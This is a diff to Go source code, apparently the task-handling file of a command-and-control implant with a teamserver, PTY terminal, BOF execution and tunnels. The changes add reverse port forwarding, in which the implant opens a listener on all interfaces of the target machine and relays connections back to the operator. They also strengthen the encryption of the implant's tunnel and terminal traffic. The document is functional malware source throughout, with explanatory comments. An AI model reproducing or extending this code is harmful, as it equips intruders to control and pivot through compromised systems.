@@ -5,9 +5,9 @@ import (
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/hmac"
 	"crypto/rand"
-	"crypto/tls"
-	"crypto/x509"
+	"crypto/sha256"
 	"encoding/base64"
 	"errors"
 	"fmt"
@@ -36,6 +36,45 @@ var TERMINALS sync.Map
 type TunnelController struct {
 	Cancel context.CancelFunc
 	Paused atomic.Bool
+}
+
+// ─────────────────── D2：方向密钥派生（消除 two-time pad）───────────────────
+//
+// 缺陷：enc 与 dec 原先共用同一对 (key, iv) ⇒ AES-CTR 两个方向产生**同一段密钥流**：
+//
+//	C(server→agent) ⊕ C(agent→server) = P(server→agent) ⊕ P(agent→server)
+//
+// 即 two-time pad。终端会话里 s→a 是操作员键入、a→s 是 shell 回显，两者异或直接还原；
+// 而 shell 提示符高度可预测 ⇒ 已知一侧明文即可解出另一侧。隧道同理。
+//
+// 修法：由同一 (key, iv) 用 HMAC-SHA256 作 KDF，派生出**两个计算上无关**的方向密钥。
+//   ★ 为什么不是"给其中一个方向换个 iv"：CTR 下同 key、iv 仅差若干比特仍产生**相关**
+//     密钥流，已知明文下可恢复；HMAC-SHA256 的输出没有这种结构。
+//   ★ 为什么不动线格式：(key, iv) 仍原样走 initMsg ⇒ 协商格式零变化，两端各自本地派生。
+//     但**两端必须同批上线** —— 只改一侧，该侧就解不出对侧（现象：隧道/终端一连就乱码）。
+//
+// ★★ 本函数在**两棵树里各有一份**，必须逐字节等价：
+//      listener: extenders/gopher_listener_tcp/pl_transport.go
+//      agent   : extenders/gopher_agent/src_gopher/tasks.go
+//    标签改一个字、拼接顺序换一下，都会**静默**错位。
+//
+// ★★ 标签按**线路方向**命名，不按本地变量名 —— 两端的 enc/dec 与方向的对应是**相反**的：
+//      server→agent : listener 用 encStream，agent 用 decStream
+//      agent→server : listener 用 decStream，agent 用 encStream
+//    按方向命名，是为了避开"照本地变量名对齐"这个几乎必然会犯的错。
+
+const (
+	axKeyLabelTunS2A  = "axc2/tunnel/s2a/v1"
+	axKeyLabelTunA2S  = "axc2/tunnel/a2s/v1"
+	axKeyLabelTermS2A = "axc2/terminal/s2a/v1"
+	axKeyLabelTermA2S = "axc2/terminal/a2s/v1"
+)
+
+func axDirKey(key, iv []byte, label string) []byte {
+	h := hmac.New(sha256.New, key)
+	h.Write([]byte(label))
+	h.Write(iv)
+	return h.Sum(nil)
 }
 
 func TaskProcess(commands [][]byte) [][]byte {
@@ -131,6 +170,12 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_TUNNEL_RESUME:
 			taskTunnelResume(command.Data)
+
+		case utils.COMMAND_TUNNEL_REVERSE:
+			// ★ 批次9：**有返回值**，与上面几个 tunnel 命令不同 ——
+			//   它们的结果走 TUNNEL_PACK 通道，而「监听起没起」必须作为**任务回答**回给
+			//   teamserver，否则 GUI 永远停在「已创建但未激活」。
+			data, err = taskTunnelReverse(command.Data)
 
 		case utils.COMMAND_UPLOAD:
 			data, err = taskUpload(command.Data)
@@ -646,25 +691,7 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 	}
 
 	var conn net.Conn
-	if profile.UseSSL {
-		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-		if certerr != nil {
-			return nil, err
-		}
-
-		caCertPool := x509.NewCertPool()
-		caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
-		}
-		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-	} else {
-		conn, err = net.Dial("tcp", profile.Addresses[0])
-	}
+	conn, err = DialProfile(profile, profile.Addresses[0])
 	if err != nil {
 		return nil, err
 	}
@@ -872,25 +899,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 	}
 
 	var conn net.Conn
-	if profile.UseSSL {
-		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-		if certerr != nil {
-			return nil, err
-		}
-
-		caCertPool := x509.NewCertPool()
-		caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
-		}
-		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-	} else {
-		conn, err = net.Dial("tcp", profile.Addresses[0])
-	}
+	conn, err = DialProfile(profile, profile.Addresses[0])
 	if err != nil {
 		return nil, err
 	}
@@ -1012,26 +1021,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 	}
 
 	var conn net.Conn
-	if profile.UseSSL {
-		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-		if certerr != nil {
-			procCancel()
-			return nil, err
-		}
-
-		caCertPool := x509.NewCertPool()
-		caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
-		}
-		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-	} else {
-		conn, err = net.Dial("tcp", profile.Addresses[0])
-	}
+	conn, err = DialProfile(profile, profile.Addresses[0])
 	if err != nil {
 		procCancel()
 		return nil, err
@@ -1262,6 +1252,168 @@ func jobRun(paramsData []byte) ([]byte, error) {
 	return nil, nil
 }
 
+// pivotDialTimeout 是 pivot（隧道）拨向**目标**的超时。
+//
+// ★ 改造前这里是硬编码的 `200 * time.Millisecond`（Phase5 §4 步骤 5）。那个值
+// 短到会让下面的原因码**说谎**：对端回 ECONNREFUSED 的 RTT 常常 >200ms ⇒ 本地先超时
+// ⇒ 上报 reason=4(timeout) 而不是 5(ECONNREFUSED)。改成 3s 后，原因码才反映真实原因。
+const pivotDialTimeout = 3 * time.Second
+
+// ── 批次9：反向端口转发（rportfwd）─────────────────────────────────────────
+
+// axPreconns 暂存「已经 accept、等着经 C2 通道回连 teamserver」的连接。
+// ★ 用 map 而不是给 jobTunnel 加参数：jobTunnel 的调用点（dispatch）不改，
+// 正向路径的唯一改动就是 dial 后多一次查表。
+var axPreconns sync.Map
+
+func axPutPreconn(channelId int, c net.Conn) { axPreconns.Store(channelId, c) }
+
+func axTakePreconn(channelId int) (net.Conn, bool) {
+	v, ok := axPreconns.LoadAndDelete(channelId)
+	if !ok {
+		return nil, false
+	}
+	c, ok := v.(net.Conn)
+	return c, ok
+}
+
+// ── axRpfLns：本 agent 自己建立的 rportfwd 监听（port → net.Listener）────────────
+// ★ 为什么需要这张表：隧道 stop 时 core **无法通知 agent** 关监听 ——
+//   ① axc2 的 adaptix.TunnelCallbacks 里没有「关监听」这个成员（只有 Close(channelId)）；
+//   ② TsTunnelStop 只关服务端的 tunnel.listener，反向的监听在 agent 上，对 REVERSE 是空操作；
+//   ③ 上游留的 TsTunnelStopRportfwd 全树零调用者，且把 TunnelId 当 channelId 传（实参语义错）。
+//   ⇒ 旧 listener 会一直占着端口。有了这张表就能：
+//     ① 补全 core 的 enable/stop 生命周期：同端口再启用时**只关自己建的**那个旧 listener，
+//        让 `TsTunnelCreate` 的 reuse 分支（"keep id for enable/stop lifecycle"）真正可用；
+//     ② 绝不去关别人的监听 —— 外来占用者照旧走 Result:0 的失败路径。
+// ★ 用 Mutex + map 而不是 sync.Map：删除必须「按身份条件删」（只删还是自己的那条），
+//   sync.Map 在不依赖 CompareAndDelete（Go 版本相关）的前提下表达不了这个语义。
+// ★ 注意上面这行与 `var (` 之间的**空行是必需的**：Go 1.19+ 的 gofmt 会把「紧贴声明的
+//   注释块」当 doc comment 重排（把 `//   xxx` 改成 `//	xxx`）⇒ 判据 X7 会红。
+//   空行让注释与声明脱钩，gofmt 就不动它（这是本批次实测出来的，见归档坑位）。
+
+var (
+	axRpfLns   = make(map[int]net.Listener)
+	axRpfLnsMu sync.Mutex
+)
+
+func axPutRpfListener(port int, ln net.Listener) {
+	axRpfLnsMu.Lock()
+	old := axRpfLns[port]
+	axRpfLns[port] = ln
+	axRpfLnsMu.Unlock()
+	if old != nil && old != ln {
+		_ = old.Close() // 同端口被顶替：关掉上一个，避免泄漏
+	}
+}
+
+func axTakeRpfListener(port int) (net.Listener, bool) {
+	axRpfLnsMu.Lock()
+	old, ok := axRpfLns[port]
+	delete(axRpfLns, port)
+	axRpfLnsMu.Unlock()
+	return old, ok
+}
+
+func axDelRpfListener(port int, ln net.Listener) {
+	axRpfLnsMu.Lock()
+	if cur, ok := axRpfLns[port]; ok && cur == ln {
+		delete(axRpfLns, port)
+	}
+	axRpfLnsMu.Unlock()
+}
+
+// axRandChannelId 生成反向通道的 channelId。
+// ★ 用 crypto/rand（本文件既有 idiom，与 tunKey/tunIv 的 rand.Read 同源），不用 math/rand：
+// 正向通道的 channelId 由 teamserver 分配、反向由 agent 自分配，两者共用 agent 侧
+// TUNNELS 这张按 channelId 索引的表 ⇒ 小值、可预测的 id 有撞表风险。
+// ★ 掩掉最高位：agent 要交叉编译到 6 个平台（含 32 位），那里 int 是 32 位，
+// 不自掩会得到负数。
+func axRandChannelId() int {
+	var b [4]byte
+	if _, err := rand.Read(b[:]); err != nil {
+		return 0
+	}
+	v := uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
+	return int(v & 0x7fffffff)
+}
+
+// taskTunnelReverse 在**目标机**上监听 params.Port（rportfwd 的第一步）。
+//
+// 与 jobTunnel 的区别：jobTunnel 是「teamserver 让我去连某处」，
+// 这里是「teamserver 让我开一个监听」—— 方向相反，所以监听地址是 0.0.0.0
+// （rportfwd 的全部意义就是让外部能连到目标机的这个端口；
+// 上游 TsTunnelCreateRportfwd 没有 Lhost 参数，也无法收窄）。
+//
+// ★ 返回值即「监听起没起」，作为任务回答回给 teamserver（走 Type-1）。
+func taskTunnelReverse(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsTunnelReverse
+	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
+		return nil, err
+	}
+
+	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", params.Port))
+	if err != nil {
+		// ★ 同端口重新启用（stop → start）：core 保留 inactive entry 并**重新下发**本任务
+		//   （ts_tunnels.go:432-443 "keep id for enable/stop lifecycle"），但 stop 时
+		//   core 通知不到 agent（见 axRpfLns 的注释）⇒ 旧 listener 仍在 ⇒ 这里 EADDRINUSE。
+		//   ⇒ 若占用者**是本 agent 为同一端口建的旧 listener**，关掉它再试一次；
+		//     外来占用者（别人的进程）**仍然失败** —— 这是判据 J1b 的前提，不得放宽。
+		if old, ok := axTakeRpfListener(params.Port); ok {
+			_ = old.Close()
+			ln, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", params.Port))
+		}
+	}
+	if err != nil {
+		// 监听失败也要回结果 —— 让 GUI 显示失败，而不是永远停在「看起来成功」。
+		return msgpack.Marshal(utils.AnsTunnelReverse{TunnelId: params.TunnelId, Result: 0})
+	}
+
+	axPutRpfListener(params.Port, ln)
+
+	go func() {
+		defer axDelRpfListener(params.Port, ln)
+		for {
+			c, aerr := ln.Accept()
+			if aerr != nil {
+				_ = ln.Close()
+				return
+			}
+			go tunnelReverseConn(c, params.TunnelId)
+		}
+	}()
+
+	return msgpack.Marshal(utils.AnsTunnelReverse{TunnelId: params.TunnelId, Result: 1})
+}
+
+// tunnelReverseConn 把一条 accept 到的外部连接，经 C2 通道交给 teamserver。
+//
+// ★★ 顺序是硬要求，反了就是改造前那种「静默假成功」：
+// teamserver 侧 pl_transport.go 的 TUNNEL_PACK 分支**先查** TsTunnelChannelExists，
+// 通道不存在直接拒收。而反向的通道是 **agent 主动申请**的，teamserver 事先
+// 不可能知道 channelId ⇒ 必须先推 COMMAND_TUNNEL_ACCEPT 让它建通道
+// （并在那里 net.Dial(Fhost:Fport)），再开 TUNNEL_PACK。
+func tunnelReverseConn(clientConn net.Conn, tunnelId int) {
+	// channelId 由 agent 侧分配：反向是 agent 主动开通道，teamserver 无法预先指定。
+	// （正向相反 —— 上游 beacon 的 channelId 直接取 teamserver 下发的 TaskId。）
+	channelId := axRandChannelId()
+	if channelId == 0 {
+		_ = clientConn.Close()
+		return
+	}
+
+	// ★ 批次9b：不再另开连接向 teamserver 通告 ACCEPT。
+	//   本 agent 的主连接是**严格一问一答**的，没有「agent 主动推送」的载体；
+	//   而三条上行通道（EXFIL/JOB/BOF）都有 TsTaskRunningExists 门。
+	//   改为把 TunnelId 随 TUNNEL_PACK 带上 —— listener 见「通道不存在且
+	//   TunnelId != 0」时现场建通道（TsTunnelConnectionAccept）再复检放行。
+	//   净效果：少一条到 teamserver 的连接、少一个协议常量、且 fail-closed。
+	// 把连接交给 jobTunnel 的管道（复用，不重写）
+	axPutPreconn(channelId, clientConn)
+	params, _ := msgpack.Marshal(utils.ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, TunnelId: tunnelId})
+	jobTunnel(params)
+}
+
 func jobTunnel(paramsData []byte) {
 	var params utils.ParamsTunnelStart
 	err := msgpack.Unmarshal(paramsData, &params)
@@ -1272,7 +1424,21 @@ func jobTunnel(paramsData []byte) {
 	go func() {
 		active := true
 		reason := byte(0)
-		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
+		clientConn, err := net.DialTimeout(params.Proto, params.Address, pivotDialTimeout)
+
+		// ★ 批次9（rportfwd）：反向端口转发的 clientConn 是 **accept 来的**，不是 dial 来的。
+		//   命中「预置连接表」就丢弃这次 dial 的结果、改用预置连接。
+		//   ★ 插入点**特意选在 dial 之后**而不是之前 —— 这样上面那行 dial 一个字都不用改，
+		//     「正向路径逐字节不变」就成了字面事实，而不是我的断言。
+		//   反向时 params.Address 为空 ⇒ net.DialTimeout 立即报 missing port 返回整数，
+		//   不产生任何网络流量、不解析任何名字；随后被这里的 err = nil 覆盖。
+		if pre, ok := axTakePreconn(params.ChannelId); ok {
+			if clientConn != nil {
+				_ = clientConn.Close()
+			}
+			clientConn = pre
+			err = nil
+		}
 		if err != nil {
 			active = false
 			var opErr *net.OpError
@@ -1290,27 +1456,11 @@ func jobTunnel(paramsData []byte) {
 		}
 
 		var srvConn net.Conn
-		if profile.UseSSL {
-			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-			if certerr != nil {
-				return
-			}
-
-			caCertPool := x509.NewCertPool()
-			caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
-			}
-			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-		} else {
-			srvConn, err = net.Dial("tcp", profile.Addresses[0])
-		}
+		srvConn, err = DialProfile(profile, profile.Addresses[0])
 		if err != nil {
-			srvConn.Close()
+			if srvConn != nil {
+				srvConn.Close()
+			}
 			return
 		}
 
@@ -1319,7 +1469,7 @@ func jobTunnel(paramsData []byte) {
 		tunIv := make([]byte, 16)
 		_, _ = rand.Read(tunIv)
 
-		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
+		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, TunnelId: params.TunnelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TUNNEL_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
@@ -1340,11 +1490,22 @@ func jobTunnel(paramsData []byte) {
 			return
 		}
 
-		encCipher, _ := aes.NewCipher(tunKey)
+		// ★ D2：两方向**必须**各用派生的密钥。enc 发往服务端 ⇒ a2s；dec 收自服务端 ⇒ s2a。
+		// ★ 顺带修 S3：原先 `_` 丢弃 aes.NewCipher 的 error。
+		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunA2S))
+		if err != nil {
+			_ = srvConn.Close()
+			_ = clientConn.Close()
+			return
+		}
 		encStream := cipher.NewCTR(encCipher, tunIv)
 		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
 
-		decCipher, _ := aes.NewCipher(tunKey)
+		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunS2A))
+		if err != nil {
+			_ = srvConn.Close()
+			return
+		}
 		decStream := cipher.NewCTR(decCipher, tunIv)
 		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
 
@@ -1435,25 +1596,7 @@ func jobTerminal(paramsData []byte) {
 		}
 
 		var srvConn net.Conn
-		if profile.UseSSL {
-			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-			if certerr != nil {
-				return
-			}
-
-			caCertPool := x509.NewCertPool()
-			caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
-			}
-			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-		} else {
-			srvConn, err = net.Dial("tcp", profile.Addresses[0])
-		}
+		srvConn, err = DialProfile(profile, profile.Addresses[0])
 		if err != nil {
 			if active {
 				functions.StopPty(ptyProc)
@@ -1492,11 +1635,21 @@ func jobTerminal(paramsData []byte) {
 			return
 		}
 
-		encCipher, _ := aes.NewCipher(tunKey)
+		// ★ D2：两方向**必须**各用派生的密钥。agent 的 enc 是 agent→server（a2s），dec 是 server→agent（s2a）。
+		// ★ 顺带修 S3：原先 `_` 丢弃 aes.NewCipher 的 error。
+		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermA2S))
+		if err != nil {
+			_ = srvConn.Close()
+			return
+		}
 		encStream := cipher.NewCTR(encCipher, tunIv)
 		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
 
-		decCipher, _ := aes.NewCipher(tunKey)
+		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermS2A))
+		if err != nil {
+			_ = srvConn.Close()
+			return
+		}
 		decStream := cipher.NewCTR(decCipher, tunIv)
 		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
 
